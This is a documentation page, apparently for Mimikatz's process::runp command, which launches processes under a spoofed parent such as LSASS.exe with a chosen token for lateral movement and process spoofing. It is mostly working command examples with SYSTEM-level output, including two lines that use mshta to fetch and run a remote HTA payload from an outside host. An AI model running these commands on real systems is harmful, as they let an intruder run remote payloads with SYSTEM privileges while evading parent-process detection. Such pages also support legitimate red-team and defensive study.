# runp

`process::runp` runs a subprocess under a parent process (Default parent process is `LSASS.exe`). It can also be used for lateral movement and process spoofing. It has the following command line arguments:

* `/run`: the name of the process
* `/ppid`: the parent process ID
* `/token`: The specified token privileges to run the new process. It can be found with `token::list`

```
mimikatz # privilege::debug
Privilege '20' OK
```

```
mimikatz # process::runp /run:notepad.exe
[pid] no argument, default for LSASS
Run : notepad.exe
PPID: 712 <---------------- This is the pid of LSASS.exe
PID: 728 - TID: 2916
{0;000003e7} 1 D 22529734       NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
```

#### Run under a specified process

```
mimikatz # process::runp /run:notepad.exe /ppid:6388
Run : notepad.exe
PPID: 6388
PID: 7360 - TID: 8488
{0;000003e7} 1 D 23539338       NT AUTHORITY\SYSTEM     S-1-5-18        (11g,08p)       Primary
```

#### mshta payload execution example

```
mimikatz # process::runp /run:"mshta http://192.168.0.220:80/delivery.hta" /ppid:2948
Run : mshta http://192.168.0.220:80/delivery.hta
PPID: 2948
PID: 7928 - TID: 1300
{0;000003e7} 1 D 25077110       NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
```

#### mshta payload execution under a specified token

```
mimikatz # process::runp /run:"mshta http://192.168.0.220:80/delivery.hta" /ppid:2948 /token:1
Run : mshta http://192.168.0.220:80/delivery.hta
PPID: 2948
PID: 7980 - TID: 9060
{0;000003e7} 1 D 25970276       NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
   G:[ DEO   ] BUILTIN\Administrators
   G:[MDE    ] Everyone
   G:[MDE    ] NT AUTHORITY\Authenticated Users
   G:[       ] Mandatory Label\System Mandatory Level
   P:[    ]    SeAssignPrimaryTokenPrivilege
   P:[    ]    SeIncreaseQuotaPrivilege
   P:[DE  ]    SeTcbPrivilege
   P:[    ]    SeSecurityPrivilege
   P:[    ]    SeTakeOwnershipPrivilege
   P:[    ]    SeLoadDriverPrivilege
   P:[DE  ]    SeProfileSingleProcessPrivilege
   P:[DE  ]    SeIncreaseBasePriorityPrivilege
   P:[DE  ]    SeCreatePermanentPrivilege
   P:[    ]    SeBackupPrivilege
   P:[    ]    SeRestorePrivilege
   P:[    ]    SeShutdownPrivilege
   P:[DE  ]    SeDebugPrivilege
   P:[DE  ]    SeAuditPrivilege
   P:[    ]    SeSystemEnvironmentPrivilege
   P:[DE  ]    SeChangeNotifyPrivilege
   P:[    ]    SeUndockPrivilege
   P:[    ]    SeManageVolumePrivilege
   P:[DE  ]    SeImpersonatePrivilege
   P:[DE  ]    SeCreateGlobalPrivilege
   P:[    ]    SeTrustedCredManAccessPrivilege
```
